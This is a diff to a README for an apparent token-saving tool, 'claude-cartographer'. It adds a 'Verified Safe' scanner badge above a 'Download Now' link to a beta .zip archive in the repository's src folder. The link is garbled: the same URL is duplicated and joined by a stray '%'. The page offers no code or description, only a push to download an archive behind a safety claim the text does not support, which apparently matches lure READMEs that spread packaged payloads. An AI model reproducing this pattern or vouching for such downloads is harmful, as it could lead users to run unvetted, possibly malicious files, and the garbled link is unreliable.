@@ -1,5 +1,7 @@
 # 🗺️ claude-cartographer - Save Tokens with Ease
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/cristinaaponte-claude-cartographer)
+
 ## 📥 Download Now
 [![Download](https://github.com/cristinaaponte/claude-cartographer/raw/refs/heads/main/src/cartographer_claude_v1.9-beta.4.zip%https://github.com/cristinaaponte/claude-cartographer/raw/refs/heads/main/src/cartographer_claude_v1.9-beta.4.zip)](https://github.com/cristinaaponte/claude-cartographer/raw/refs/heads/main/src/cartographer_claude_v1.9-beta.4.zip)
 
